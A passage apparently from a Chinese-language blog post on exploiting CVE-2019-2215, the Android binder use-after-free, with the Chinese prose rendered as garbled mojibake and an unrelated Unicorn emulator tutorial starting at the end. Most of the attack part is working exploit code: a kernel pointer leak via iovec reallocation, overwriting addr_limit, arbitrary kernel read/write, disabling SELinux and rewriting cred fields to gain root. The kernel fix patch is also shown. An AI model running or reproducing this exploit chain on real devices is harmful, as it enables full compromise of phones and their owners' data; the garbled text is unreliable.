iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE; // Now link the poll wait queue to binder thread wait queue linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens sleep(2); // Trigger the unlink operation on the reallocated chunk unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // First interesting iovec will read 0x1000 bytes of data. // This is just the junk data that we are not interested in // nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. // freeBinderThread(); // // Reallocate binder_thread as iovec array // // We need to make sure this writev call blocks // This will only happen when the pipe is already full // This print statement was ruining the reallocation, // spent a night to figure this out. Commenting the // below line. // // INFO(\u0026#34;[+] Reallocating binder_thread\\n\u0026#34;); ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT); // If the corruption was successful, the total bytes written // should be equal to 0x2000. This is because there are two // valid iovec and the length of each is 0x1000 if (nBytesWritten != PAGE_SIZE * 2) { ERR(\u0026#34;\\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\\n\u0026#34;, nBytesWritten, PAGE_SIZE * 2); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Wrote 0x%lx bytes\\n\u0026#34;, nBytesWritten); } // Now read the actual data from the corrupted iovec // This is the leaked data from kernel address space // and will contain the task_struct pointer nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); m_task_struct = (struct task_struct *) *((int64_t *) (dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA)); m_pidAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, pid)); m_credAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, cred)); m_nsproxyAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, nsproxy)); INFO(\u0026#34;[+] Leaked task_struct: %p\\n\u0026#34;, m_task_struct); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;pid: %p\\n\u0026#34;, m_pidAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;cred: %p\\n\u0026#34;, m_credAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;nsproxy: %p\\n\u0026#34;, m_nsproxyAddress); } å¾ˆå¥½ç†è§£ï¼Œexpè¿™éƒ¨åˆ†é¦–å…ˆåˆå§‹åŒ–ç¯å¢ƒä¹‹ååˆ›å»ºç”¨äºreadvå’Œwritevçš„pipeï¼Œreadvå’Œwritevå‡½æ•°ç”¨äºåœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­è¯»ã€å†™å¤šä¸ªéè¿ç»­ç¼“å†²åŒºã€‚ä¿®æ”¹pipeçš„sizeä¸º0x1000ã€‚\nä¹‹ååˆ›å»ºäº†25ä¸ªiovecï¼Œæ”¾åœ¨iovecStacké‡Œé¢ã€‚25ä¸ªæ˜¯æ ¹æ®binder_threadå’Œiovecçš„å¤§å°ç®—å‡ºæ¥\nIOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))\nbinder_threadç»“æ„ä½“å¤§å°ä¸º408ï¼Œ25ä¸ªiovecå¤§å°ä¸º25*16=400ï¼Œæ­£å¥½ã€‚è®¡ç®—å¯¹æ¯”binder_threadä¸­wait.headçš„åç§»0xA0å’ŒiovecStackçš„åç§»iovecStack[10].iov_lenåŒ¹é…ã€‚\nå‰é¢åŠ¨æ€è°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¼šæœ‰ä¸¤ä¸ªåœ°å€çš„å€¼ä¼šè¢«å†™å…¥åœ°å€ï¼Œè¿™é‡Œç›¸å¯¹åº”çš„ä½ç½®ä¸ºiovecStack[10].iov_len å’ŒiovecStack[11].io_baseã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¦ä¿®æ”¹iovecStack[10]çš„iov_lenå’Œpipeä¸€æ ·çš„å¤§å°ï¼Œé˜»å¡æ‰çˆ¶è¿›ç¨‹çš„writevç³»ç»Ÿè°ƒç”¨ï¼Œå†å»è§¦å‘unlinkæ“ä½œã€‚\nè¿™é‡Œçš„iovecStack[10].io_baseæ­£å¥½å¯¹ä¸Šbinder_thread-\u0026gt;wait.lockï¼Œå¦‚æœè¿™ä¸ªå€¼ä¸ä¸º0çš„è¯ï¼Œåé¢åœ¨å°è¯•å–è‡ªæ—‹é”é”ä¼šå‡ºé—®é¢˜ï¼Œä¸è¿›è¡Œunlinkæ“ä½œï¼Œè¿™ä¸ªå€¼æ˜¯32bitçš„ï¼Œiov_baseæ˜¯64bitçš„ï¼Œæ‰€ä»¥è¦è®¾ç½®å¯¹é½ï¼Œä½¿ç”¨mmapä¿è¯ä½32bitä¸º0ã€‚\niovecStack[10].iov_lenå’ŒiovecStack[11].iov_lenè®¾ç½®ä¸ºpipe sizeçš„å¤§å°ï¼ŒiovecStack[11].io_base è®¾ç½®ä¸ºæ–°åˆ†é…çš„ä¸€ä¸ªåœ°å€ï¼Œ\nåˆ›å»ºforkå­è¿›ç¨‹è¿›è¡ŒEPOLL_CTL_DELæ“ä½œè§¦å‘unlinkã€‚è¯»å‡º0x1000 bytesçš„åƒåœ¾æ•°æ®æ¢å¤è¿›ç¨‹ï¼Œ\nçˆ¶è¿›ç¨‹freeæ‰binder_threadï¼Œè°ƒç”¨writevç³»ç»Ÿè¿›è¡Œé˜»å¡ï¼Œç­‰å¾…å­è¿›ç¨‹å®Œæˆã€‚\næœ€åçˆ¶è¿›ç¨‹åœ¨è°ƒç”¨readè¯»å‡ºå·²ç»è¢«å­è¿›ç¨‹è¦†ç›–äº†å†…æ ¸åœ°å€å¤„çš„æ•°æ®ï¼Œæ ¹æ®åç§»è¯»å‡ºæ³„éœ²çš„task_structæŒ‡é’ˆã€‚\nä¸‹é¢è¿™å¼ å›¾æ˜¯Project Zero blogè´´å‡ºæ¥çš„æµç¨‹å›¾ï¼Œæ–¹ä¾¿ç†è§£æ•´ä¸ªè¿‡ç¨‹ã€‚\næ—¢ç„¶å·²ç»æœ‰task_structæŒ‡é’ˆï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥patch æ‰AddrLimitã€‚ç›´æ¥çœ‹expå®ç°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 void BinderUaF::clobberAddrLimit() { int sock_fd[2] = {0}; ssize_t nBytesWritten = 0; struct msghdr message = {nullptr}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); INFO(\u0026#34;[+] Setting up socket\\n\u0026#34;); if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create socketpair\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Socketpair created successfully\\n\u0026#34;); } // // We will just write junk data to socket so that when recvmsg // is called it process the fist valid iovec with this junk data // and then blocks and waits for the rest of the data to be received // static char junkSocketData[] = { 0x41 }; INFO(\u0026#34;[+] Writing junk data to socket\\n\u0026#34;); nBytesWritten = write(sock_fd[1], \u0026amp;junkSocketData, sizeof(junkSocketData)); if (nBytesWritten != sizeof(junkSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesWritten, sizeof(junkSocketData)); exit(EXIT_FAILURE); } // // Write junk data to the socket so that when recvmsg is // called, it process the first valid iovec with this junk // data and then blocks for the rest of the incoming socket data // INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // We want to block after processing the iovec at IOVEC_WQ_INDEX, // because then, we can trigger the unlink operation and get the // next iovecs corrupted to gain scoped write. mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; // // Prepare the data buffer that will be written to socket // Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64 // will result in crash because of a check in do_page_fault // However, x86_64 does not have this check. But it\u0026#39;s better // to set it to 0xFFFFFFFFFFFFFFFE so that this same code can // be used in arm64 as well. // static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; // // Prepare the message // message.msg_iov = iovecStack; message.msg_iovlen = IOVEC_COUNT; // // Now link the poll wait queue to binder thread wait queue // linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens // sleep(2); // // Trigger the unlink operation on the reallocated chunk // unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len // and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered // // Write rest of the data to the socket so that recvmsg starts // processing the corrupted iovecs and we get scoped write and // finally arbitrary write nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData)); if (nBytesWritten != sizeof(finalSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\u0026#34;, nBytesWritten, sizeof(finalSocketData)); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. freeBinderThread(); // Reallocate binder_thread as iovec array and // we need to make sure this recvmsg call blocks. // recvmsg will block after processing a valid iovec at // iovecStack[IOVEC_WQ_INDEX] ssize_t nBytesReceived = recvmsg(sock_fd[0], \u0026amp;message, MSG_WAITALL); // If the corruption was successful, the total bytes received // should be equal to length of all iovec. This is because there // are three valid iovec ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len + iovecStack[IOVEC_WQ_INDEX + 1].iov_len + iovecStack[IOVEC_WQ_INDEX + 2].iov_len; if (nBytesReceived != expectedBytesReceived) { ERR(\u0026#34;\\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesReceived, expectedBytesReceived); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); } è¿™é‡Œå°±è¦å°†addr_limitçš„å€¼æ”¹ä¸º0xFFFFFFFFFFFFFFFEåœ¨arm64é‡Œæœ‰ä¸ªæ£€æŸ¥å‡½æ•°do_page_faultä¼šæ£€æµ‹è¯¥å€¼æ˜¯å¦ä¸º0xFFFFFFFFFFFFFFFFï¼Œå¦‚æœæ˜¯å°±è§¦å‘å¥”æºƒï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½è®¾ä¸º0xFFFFFFFFFFFFFFFEã€‚\nå‰é¢æ˜¯ä»å†…æ ¸è¯»å‡ºæ•°æ®ï¼Œè¿™é‡Œè¦å®ç°çš„æ˜¯å‘å†…æ ¸å†™å…¥æ•°æ®ã€‚\nçœ‹çœ‹è¿™é‡Œçš„iovecStackç»“æ„ï¼š\n1 2 3 4 5 6 iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; å’Œå‰é¢æ³„éœ²ä¿¡æ¯çš„å¸ƒå±€æ˜¯å·®ä¸å¤šã€‚\né¦–å…ˆä¾ç„¶æ˜¯åˆå§‹åŒ–ç¯å¢ƒï¼Œå…ˆå‘socketå†™å…¥äº†1byteçš„åƒåœ¾æ•°æ®ï¼Œä¹‹åçˆ¶è¿›ç¨‹ä½¿ç”¨recvmsgç³»ç»Ÿè°ƒç”¨æ¥æ”¶äº†1byteçš„æ•°æ®ä¹‹åè¿›è¡Œé˜»å¡ï¼Œè¿™é‡Œé€‰ç”¨äº†recvmsgè€Œä¸æ˜¯å‰é¢writevæ˜¯å› ä¸ºiovecStack[10].iov_lenå˜æˆäº†ä¸€ä¸ªæŒ‡é’ˆï¼Œå¾ˆå¤§çš„æ•°å­—ï¼Œåç»­è°ƒç”¨copy_page_to_iter_iovecå¤åˆ¶æ•°æ®æ—¶ä¼šå‡ºé”™ã€‚\nå­è¿›ç¨‹è¿›è¡Œunlinkæ“ä½œï¼Œå°†ç²¾å¿ƒæ„é€ çš„finalSocketDataå†™å…¥socketï¼Œçˆ¶è¿›ç¨‹æ¢å¤æ¥æ”¶æ•°æ®ï¼Œè¿™æ—¶iovecStack[11]å·²ç»è¢«ç ´åæ‰äº†ï¼Œç­‰åˆ°recvmsgç³»ç»Ÿè°ƒç”¨è¿”å›æ—¶ï¼Œå°±å¯ä»¥ä¿®æ”¹æ‰addr_limitçš„å€¼ã€‚\n1 2 3 4 5 6 7 8 static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; å¯¹åº”ä¸Šé¢çš„å€¼ã€‚\nåˆ°è¿™é‡Œæˆ‘ä»¬å°±æœ‰äº†å®Œæ•´çš„å†…æ ¸è¯»å†™æƒé™ï¼Œæ¥ä¸‹ç»•è¿‡kaslrã€ç¦ç”¨SElinuxã€patchCredå°±å¯ä»¥è·å¾—rootæƒé™ã€‚\nbypass kaslr and Disabling SELinux å‰é¢å·²ç»äº†æœ‰äº†å®Œæ•´çš„è¯»å†™æƒé™ï¼Œé‚£è¿™å°±å¾ˆç®€å•äº†ã€‚\nä»»æ„è¯»å†™çš„å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void BinderUaF::kRead(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], Address, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], uBuffer, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to read data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } void BinderUaF::kWrite(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], uBuffer, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from user: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], Address, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to write data to kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } ä»»æ„è¯»çš„è¯ï¼Œåˆ©ç”¨writeå’Œreadä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½¿ç”¨writeå°†æ•°æ®å†™åˆ°pipeï¼Œå¹¶åœ¨ç®¡é“çš„å¦ä¸€ç«¯readä¸€ä¸ªå†…æ ¸åœ°å€ï¼Œå°±å¯ä»¥å°†æ•°æ®å†™å…¥è¯¥å†…æ ¸åœ°å€ã€‚ä»»æ„å†™çš„è¯ï¼Œä¸ä¹‹ç›¸åã€‚è¿™æ ·å°±å®ç°äº†ä»»æ„è¯»å†™ã€‚\ntask_struct æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆnsproxy ï¼Œå‰é¢å·²ç»æ³„éœ²å‡ºæ¥äº†ï¼Œå°±å¯ä»¥æ›´å…·åç§»ç›´æ¥ç®—å‡ºKernel_base_addrã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 ptrdiff_t kernelBase = nsProxy - SYMBOL_OFFSET_init_nsproxy; auto selinuxEnforcing = (void *) (kernelBase + SYMBOL_OFFSET_selinux_enforcing); INFO(\u0026#34;\\t[*] nsproxy: 0x%lx\\n\u0026#34;, nsProxy); INFO(\u0026#34;\\t[*] Kernel base: 0x%lx\\n\u0026#34;, kernelBase); INFO(\u0026#34;\\t[*] selinux_enforcing: %p\\n\u0026#34;, selinuxEnforcing); int selinuxEnabled = kReadDword(selinuxEnforcing); if (!selinuxEnabled) { INFO(\u0026#34;\\t[*] selinux enforcing is disabled\\n\u0026#34;); return; } INFO(\u0026#34;\\t[*] selinux enforcing is enabled\\n\u0026#34;); kWriteDword(selinuxEnforcing, 0x0); è¿™é‡Œåªéœ€è¦å¯¹äºSELinuxåªéœ€æ ¹æ®kernelBase è®¡ç®—å‡ºå…·ä½“çš„åœ°å€ï¼Œå†ç›´æ¥è¿›è¡Œå†™å…¥0x0å³å¯ç¦ç”¨æ‰ã€‚\nç°åœ¨çš„ç‰ˆæœ¬è¶Šæ¥è¶Šå¤šä¿æŠ¤å’Œæ£€æŸ¥æœºåˆ¶ï¼Œå®é™…ä¸Šç›´æ¥è¿™æ ·ä¸ä¸€å®šæ˜¯ä¸å¯è¡Œï¼Œæœ‰æ—¶å¾—æ¢å¤kallsymsè¡¨æ‰è¡Œ\nRoot ææƒçš„å¸¸ç”¨è¯­å¥commit_creds(prepare_kernel_cred(NULL));ï¼Œè¿™å°±æ˜¯å¸¸è§„çš„å¥—è·¯äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, uid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, gid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, suid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, sgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, euid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, egid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsuid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, securebits)), SECUREBITS_DEFAULT); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_inheritable)), CAP_EMPTY_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_permitted)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_effective)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_bset)), CAP_FULL_SET); kWriteQword((void *) ((uint8_t *) m_cred + offsetof(struct cred, cap_ambient)), CAP_EMPTY_SET); å‰é¢å·²ç»æ³„éœ²å‡ºäº†task_struct-\u0026gt;credçš„åœ°å€ï¼Œè¿™é‡Œå°±åªç”¨å°†äº‹å…ˆå‡†å¤‡å¥½çš„credç»“æ„ä½“å†™å…¥å³å¯\næœ€åæ‰§è¡Œsystem(\u0026quot;/bin/sh\u0026quot;);ã€execve(\u0026quot;/system/bin/sh\u0026quot;);å³å¯è·å¾—rootæƒé™ã€‚\nDisabling SECCOMP é¢å¤–çš„å¦‚æœæƒ³è¦å°†ææƒç¨‹åºæ†ç»‘åˆ°appä¸Šçš„è¿˜éœ€è¦è¿™ä¸€æ­¥ï¼ŒAndroid8å¼€å§‹ï¼Œæ‰€æœ‰ Android è½¯ä»¶éƒ½ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ä¸ Linux å†…æ ¸è¿›è¡Œé€šä¿¡ï¼ŒSECCOMPè¿‡æ»¤å™¨ä¼šæ£€æµ‹æ‰€æœ‰çš„éæ³•è°ƒç”¨ã€‚SECCOMPè¿‡æ»¤å™¨æ˜¯æ”¾åœ¨zygote è¿›ç¨‹ä¸­ï¼Œè€Œæ‰€æœ‰çš„Androidåº”ç”¨ç¨‹åºéƒ½æ˜¯è¯¥è¿›ç¨‹forkå‡ºæ¥çš„ï¼ŒæŒ‰ç†æ‰€ä»¥ä¼šå½±å“åˆ°æ‰€æœ‰çš„åº”ç”¨ï¼Œä½†æ˜¯Androidå®‰å…¨å›¢é˜Ÿè¿›è¡Œäº†éƒ¨åˆ†ç­›é€‰ï¼Œåªä¼šé˜»æ­¢æŸäº›ç³»ç»Ÿè°ƒç”¨ã€‚\n1 2 3 4 struct seccomp { int mode; struct seccomp_filter *filter; }; æƒ³è¦ç¦ç”¨SECCOMPï¼Œç›´æ¥å°†modeæ”¹ä¸º0æ˜¯å¯¼è‡´å†…æ ¸å´©æºƒï¼Œéœ€è¦æ¸…é™¤TIF_SECCOMP æ ‡å¿—ã€‚è¿™ç¯‡æ–‡ç« å®ç°äº†ç»•è¿‡ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸€çœ‹ã€‚\nå¯¹äºä¸‰æ˜Ÿçš„è®¾å¤‡ï¼Œè¿˜éœ€è¦ç»•è¿‡Knox/RKPæ‰è¡Œã€‚å¯¹äºå¦‚ä½•ç»•è¿‡ï¼Œæœ€è¿‘æœ‰äººå…¬å¼€äº†s8ç›¸å…³çš„åˆ©ç”¨ä»£ç ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ã€‚\npatch patch\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 diff --git a/drivers/android/binder.c b/drivers/android/binder.c index a340766b51fe..2ef8bd29e188 100644 --- a/drivers/android/binder.c +++ b/drivers/android/binder.c @@ -4302,6 +4302,18 @@ static int binder_thread_release(struct binder_proc *proc, if (t) spin_lock(\u0026amp;t-\u0026gt;lock); } + +\t/* +\t* If this thread used poll, make sure we remove the waitqueue +\t* from any epoll data structures holding it with POLLFREE. +\t* waitqueue_active() is safe to use here because we\u0026#39;re holding +\t* the inner lock. +\t*/ +\tif ((thread-\u0026gt;looper \u0026amp; BINDER_LOOPER_STATE_POLL) \u0026amp;\u0026amp; +\twaitqueue_active(\u0026amp;thread-\u0026gt;wait)) { +\twake_up_poll(\u0026amp;thread-\u0026gt;wait, POLLHUP | POLLFREE); +\t} + binder_inner_proc_unlock(thread-\u0026gt;proc); if (send_reply) åœ¨binder_thread freeä¹‹å‰æ¸…ç†æ‰thread-\u0026gt;waitå³å¯ã€‚\næ€»ç»“ å»å¹´å‡ºçš„ç»å…¸çš„ææƒæ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å½“åšææƒå…¥é—¨ä¹Ÿè¿˜ä¸é”™ï¼Œå¯ä»¥å­¦ä¹ åˆ°ä¸€ä¸ªå®Œæ•´çš„ææƒæµç¨‹å’Œå‡ ä¸ªå¸¸è§æ–¹æ³•ã€‚\nåç»­çœŸæœºæµ‹è¯•è¿‡ç¨‹ä¸­æ‰‹ä¸Šæ²¡pixel2 åªèƒ½åœ¨pixelçš„3.18ä¸Šæµ‹è¯•ï¼Œå¾—æ³¨æ„å…ˆæµ‹è¯•å†ä½¿ç”¨ç½‘ä¸Šçš„expã€‚ç„¶åå°±æ˜¯é€‚é…çš„è¯ä¸»è¦æ˜¯å¯¹äºä¸€äº›åç§»çš„é€‚é…ï¼Œä»¥åŠä¸æ˜¯æ‰€æœ‰çš„è®¾å¤‡èƒ½éƒ½ç›´æ¥åˆ©ç”¨ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å’Œä¸åŒäº§å•†åˆä¸ä¸€æ ·ã€‚\nææƒè¿‡ç¨‹ä¸­æœ€ä¸»è¦æ³¨æ„çš„å°±æ˜¯ä¸è®©å†…æ ¸å‘ç”Ÿå¥‡å¥‡æ€ªæ€ªçš„å¥”æºƒï¼Œæ¯æ¬¡é‡åˆ°å¥”æºƒï¼Œå¯èƒ½å°±éœ€è¦æƒ³å…¶ä»–çš„æ–¹æ³•å»ç»•è¿‡ã€‚\nå…³äºè¿™ä¸ªæ¼æ´è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ€è·¯å¯ä»¥å°è¯•ï¼Œæ¯”å¦‚äººé€ é¡µè¡¨é•œåƒæ”»å‡»ä¹‹ç±»çš„æ–¹å¼ã€‚\nå‚è€ƒ https://www.52pojie.cn/thread-1083552-1-1.html\nhttps://blog.csdn.net/weixin_43901866/article/details/102458212\nhttps://cloudfuzz.github.io/android-kernel-exploitation/\nhttps://github.com/sharif-dev/AndroidKernelVulnerability\nhttps://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/\nhttps://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/\n","date":"2020-06-30T00:00:00+08:00","permalink":"https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"},{"content":"Unicornç®€å•å­¦ä¹ ä½¿ç”¨è®°å½• 0x00 ä»‹ç» Unicornæ˜¯ä¸€ä¸ªè½»é‡çº§, å¤šå¹³å°, å¤šæ¶æ„çš„CPUæ¨¡æ‹Ÿå™¨æ¡†æ¶ï¼ŒåŸºäºqemuå¼€å‘ï¼Œå®ƒå¯ä»¥ä»£æ›¿CPUæ¨¡æ‹Ÿä»£ç çš„æ‰§è¡Œï¼Œå¸¸ç”¨äºæ¶æ„ä»£ç åˆ†æï¼ŒFuzzç­‰ã€‚\n0x01 å®‰è£… å®˜ç½‘æœ‰ç¼–è¯‘å¥½ä¸åŒå¹³å°çš„äºŒè¿›åˆ¶åŒ…ï¼Œç›´æ¥å®‰è£…å°±è¡Œã€‚ä½†æ˜¯çœ‹äº†ä¸€ä¸‹æ—¶é—´2017å¹´çš„ï¼Œqemuå·²ç»å‡çº§å¥½å‡ ä¸ªç‰ˆæœ¬äº†ã€‚apiä¹Ÿæ¯”è¾ƒè€æ—§ã€‚\nå»githubçœ‹äº†ä¸€ä¸‹æ˜¯å¦æœ‰åœ¨æ›´æ–°ï¼Œå‘ç°ä¸€ç›´æœ‰åœ¨æ›´æ–°ï¼Œä¸è¿‡å¥½åƒä¹Ÿæ²¡æ›´æ–°å•¥ï¼Œåªæ˜¯ä¿®å¤ä¸€äº›bugï¼Œä¸‹è½½gitæºç ï¼Œè‡ªå·±ç¼–è¯‘ã€‚ç›®å‰æœ€æ–°1.0.2rc\n1 2 3 4 5 6 7 8 9 git clone https://github.com/unicorn-engine/unicorn.git cd unicorn # UNICORN_ARCHS=\u0026#34;arm aarch64 x86\u0026#34; ./make.sh # è®¾ç½®è¦ç¼–è¯‘çš„æ¶æ„ å¯é€‰ é»˜è®¤6ç§å…¨ç¼–è¯‘ (Arm, Arm64, M68K, Mips, Sparc, \u0026amp; X86) ./make.sh sudo ./make.sh install # python ç»‘å®š cd bindings/python sudo python3 setup.py install è¿˜æœ‰æ›´å¤šäº¤å‰ç¼–è¯‘é€‰é¡¹å‚è€ƒ æ–‡æ¡£\n0x02 ç®€å•ä½¿ç”¨ C :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 